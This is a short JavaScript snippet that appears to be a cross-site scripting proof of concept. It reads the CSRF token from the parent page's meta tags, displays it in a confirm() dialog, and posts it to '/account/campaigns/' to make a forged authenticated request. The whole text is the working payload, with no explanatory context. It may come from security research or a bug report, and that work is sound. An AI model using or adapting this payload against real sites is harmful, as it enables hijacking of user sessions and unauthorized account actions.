
var meta = parent.document.getElementsByTagName('meta');
for (i=0; i<meta.length; i++) {
  if (meta[i].getAttribute("name") == "csrf-token") {
    confirm("Users CSRF token: "+meta[i].getAttribute("content"));
    $.post( "/account/campaigns/", { csrf: meta[i].getAttribute("content") } );
  }
}
